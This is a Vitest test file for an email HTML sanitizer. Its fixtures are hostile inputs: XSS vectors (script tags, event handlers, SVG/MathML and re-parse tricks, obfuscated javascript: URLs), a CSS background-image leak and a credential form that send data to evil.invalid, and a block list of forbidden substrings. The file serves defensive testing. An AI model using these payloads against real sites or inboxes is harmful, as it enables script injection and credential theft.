import { describe, expect, it } from "vitest";
import { sanitizeEmailHtml } from "@/lib/modules/change-orders/mail/sanitize";

/**
 * Hostile fixtures.
 *
 * Every payload here is something a vendor could put in an email to
 * changeorder@phb1899.com. The assertions are deliberately about what is absent
 * from the output rather than about what the output looks like - a sanitizer that
 * merely reformats a payload has not defended anything.
 */

/** Things that must never survive, whatever else the output contains. */
const FORBIDDEN_SUBSTRINGS = [
  "<script",
  "javascript:",
  "vbscript:",
  "onerror",
  "onload",
  "onclick",
  "onmouseover",
  "onfocus",
  "onstart",
  "onanimationstart",
  "<iframe",
  "<object",
  "<embed",
  "<form",
  "<input",
  "<link",
  "<meta",
  "<base",
  "<style",
  "srcdoc",
  "formaction",
  "xlink:href",
  "<svg",
  "<math",
];

function clean(html: string): string {
  return sanitizeEmailHtml(html).html;
}

function expectNeutralised(html: string): string {
  const output = clean(html);
  const lower = output.toLowerCase();

  for (const forbidden of FORBIDDEN_SUBSTRINGS) {
    expect(lower, `output still contains ${forbidden}: ${output}`).not.toContain(
      forbidden,
    );
  }

  return output;
}

describe("script execution", () => {
  const payloads: Array<[string, string]> = [
    ["plain script tag", '<p>hi</p><script>alert(1)</script>'],
    ["uppercase script tag", "<SCRIPT>alert(1)</SCRIPT>"],
    ["split across attributes", '<img src=x onerror="alert(1)">'],
    ["event handler on a permitted tag", '<p onclick="alert(1)">text</p>'],
    ["unquoted event handler", "<div onmouseover=alert(1)>text</div>"],
    ["svg with a script child", "<svg><script>alert(1)</script></svg>"],
    ["svg animation handler", '<svg><animate onbegin="alert(1)"></svg>'],
    ["mathml mutation vector", "<math><mtext><script>alert(1)</script></mtext></math>"],
    ["iframe srcdoc", '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
    ["object data", '<object data="javascript:alert(1)"></object>'],
    ["embed", '<embed src="https://evil.invalid/x.swf">'],
    ["body onload", '<body onload="alert(1)">text</body>'],
    ["noscript re-parse", "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"],
    ["textarea re-parse", "<textarea><img src=x onerror=alert(1)></textarea>"],
    ["template re-parse", "<template><img src=x onerror=alert(1)></template>"],
    ["xmp re-parse", "<xmp><script>alert(1)</script></xmp>"],
    ["nested broken tags", "<scr<script>ipt>alert(1)</script>"],
    ["null byte in tag name", "<scri\u0000pt>alert(1)</scri\u0000pt>"],
  ];

  for (const [name, payload] of payloads) {
    it(`neutralises ${name}`, () => {
      expectNeutralised(payload);
    });
  }

  it("discards script content rather than leaving it as body text", () => {
    const output = clean("<p>Quote</p><script>stealCredentials()</script>");

    expect(output).toContain("Quote");
    expect(output).not.toContain("stealCredentials");
  });
});

describe("dangerous URL schemes", () => {
  const payloads: Array<[string, string]> = [
    ["javascript link", '<a href="javascript:alert(1)">click</a>'],
    ["uppercase scheme", '<a href="JaVaScRiPt:alert(1)">click</a>'],
    ["entity-encoded colon", '<a href="javascript&colon;alert(1)">click</a>'],
    ["whitespace-padded scheme", '<a href=" javascript:alert(1)">click</a>'],
    ["tab inside the scheme", '<a href="java\tscript:alert(1)">click</a>'],
    ["vbscript link", '<a href="vbscript:msgbox(1)">click</a>'],
    ["data html link", '<a href="data:text/html;base64,PHNjcmlwdD4=">click</a>'],
    ["file link", '<a href="file:///c:/windows/system32">click</a>'],
  ];

  for (const [name, payload] of payloads) {
    it(`strips a ${name}`, () => {
      const output = expectNeutralised(payload);
      // The text survives; the link does not.
      expect(output).toContain("click");
      expect(output.toLowerCase()).not.toMatch(/href="(javascript|vbscript|data|file)/);
    });
  }

  it("keeps an ordinary https link and hardens it", () => {
    const output = clean('<a href="https://vendor.invalid/quote">quote</a>');

    expect(output).toContain('href="https://vendor.invalid/quote"');
    expect(output).toContain('rel="noopener noreferrer nofollow"');
    expect(output).toContain('target="_blank"');
  });

  it("overwrites a sender-supplied rel and target", () => {
    const output = clean('<a href="https://vendor.invalid" rel="dns-prefetch" target="_self">x</a>');

    expect(output).not.toContain("dns-prefetch");
    expect(output).not.toContain("_self");
    expect(output).toContain('rel="noopener noreferrer nofollow"');
  });

  it("blocks a protocol-relative URL", () => {
    const output = clean('<a href="//evil.invalid/x">click</a>');

    expect(output).not.toContain("evil.invalid");
  });

  it("keeps mailto and tel, which a vendor legitimately uses", () => {
    const output = clean(
      '<a href="mailto:sales@vendor.invalid">mail</a><a href="tel:+15135550100">call</a>',
    );

    expect(output).toContain("mailto:sales@vendor.invalid");
    expect(output).toContain("tel:+15135550100");
  });
});

describe("remote content", () => {
  it("blocks a remote image and reports it", () => {
    const result = sanitizeEmailHtml(
      '<p>hi</p><img src="https://tracker.invalid/px.gif?id=42" alt="">',
    );

    expect(result.remoteImagesBlocked).toBe(1);
    // The tracker URL is gone entirely, not stashed in a data attribute.
    expect(result.html).not.toContain("tracker.invalid");
    expect(result.html).toContain('data-remote-blocked="true"');
  });

  it("counts every blocked image, not just the first", () => {
    const result = sanitizeEmailHtml(
      '<img src="http://a.invalid/1.gif"><img src="https://b.invalid/2.gif">' +
        '<img src="//c.invalid/3.gif">',
    );

    expect(result.remoteImagesBlocked).toBe(3);
    expect(result.html).not.toContain("a.invalid");
  });

  it("allows remote images only when explicitly asked", () => {
    const result = sanitizeEmailHtml('<img src="https://vendor.invalid/logo.png">', {
      allowRemoteImages: true,
    });

    expect(result.remoteImagesBlocked).toBe(0);
    expect(result.html).toContain('src="https://vendor.invalid/logo.png"');
  });

  it("does not treat a cid: inline image as remote", () => {
    const result = sanitizeEmailHtml('<img src="cid:logo123" alt="logo">');

    expect(result.remoteImagesBlocked).toBe(0);
    expect(result.html).toContain("cid:logo123");
  });

  it("never lets a javascript: URL through the blocked-image attribute", () => {
    const result = sanitizeEmailHtml('<img src="javascript:alert(1)">');

    expect(result.html).not.toContain("javascript:");
    expect(result.html).not.toContain("alert(1)");
  });
});

describe("style-based attacks", () => {
  it("strips a style attribute entirely", () => {
    const output = clean(
      '<div style="background-image:url(https://evil.invalid/leak?data=x)">text</div>',
    );

    expect(output).not.toContain("style");
    expect(output).not.toContain("evil.invalid");
    expect(output).toContain("text");
  });

  it("strips a style element and its contents", () => {
    const output = expectNeutralised(
      "<style>@import url(https://evil.invalid/x.css); p{background:url(https://evil.invalid/p)}</style><p>text</p>",
    );

    expect(output).not.toContain("evil.invalid");
    expect(output).toContain("text");
  });

  it("strips an overlay attempt", () => {
    const output = clean(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">Sign in</div>',
    );

    expect(output).not.toContain("position:fixed");
  });

  it("strips class and id, which only matter with a stylesheet we do not allow", () => {
    const output = clean('<p class="phb-admin-panel" id="root">text</p>');

    expect(output).not.toContain("phb-admin-panel");
    expect(output).not.toContain('id="root"');
  });
});

describe("document-level injection", () => {
  const payloads: Array<[string, string]> = [
    ["base tag", '<base href="https://evil.invalid/">'],
    ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.invalid">'],
    ["remote stylesheet", '<link rel="stylesheet" href="https://evil.invalid/x.css">'],
    ["credential form", '<form action="https://evil.invalid/steal"><input name="password"></form>'],
    ["frameset", "<frameset><frame src=\"https://evil.invalid\"></frameset>"],
    ["applet", '<applet code="Evil.class"></applet>'],
  ];

  for (const [name, payload] of payloads) {
    it(`discards a ${name}`, () => {
      const output = expectNeutralised(payload);
      expect(output).not.toContain("evil.invalid");
    });
  }

  it("discards a conditional comment payload", () => {
    const output = expectNeutralised(
      "<!--[if IE]><script>alert(1)</script><![endif]--><p>text</p>",
    );

    expect(output).toContain("text");
    expect(output).not.toContain("[if IE]");
  });

  it("does not treat content after a stray </html> as a new document", () => {
    const output = expectNeutralised(
      "<p>legit</p></html><script>alert(1)</script>",
    );

    expect(output).toContain("legit");
  });
});

describe("legitimate business email survives", () => {
  it("keeps the structure a vendor quote actually uses", () => {
    const output = clean(`
      <div>
        <p>Please see our pricing for <strong>CO 1234</strong>:</p>
        <table border="1" cellpadding="4">
          <thead><tr><th scope="col">Item</th><th scope="col">Price</th></tr></thead>
          <tbody><tr><td>Ductwork</td><td align="right">4,200.00</td></tr></tbody>
        </table>
        <blockquote>Quoted per drawing A-101.</blockquote>
        <ul><li>Lead time 3 weeks</li></ul>
        <p>Regards,<br>Vendor Co</p>
      </div>
    `);

    expect(output).toContain("<strong>CO 1234</strong>");
    expect(output).toContain("<table");
    expect(output).toContain("<th scope=\"col\">Item</th>");
    expect(output).toContain("align=\"right\"");
    expect(output).toContain("<blockquote>");
    expect(output).toContain("<li>Lead time 3 weeks</li>");
    expect(output).toContain("<br />");
  });

  it("leaves already-escaped markup escaped", () => {
    const output = clean("<p>Use &lt;script&gt; carefully</p>");

    expect(output).toContain("&lt;script&gt;");
    expect(output.toLowerCase()).not.toContain("<script");
  });

  it("handles an empty body without throwing", () => {
    expect(sanitizeEmailHtml("")).toEqual({ html: "", remoteImagesBlocked: 0 });
  });
});
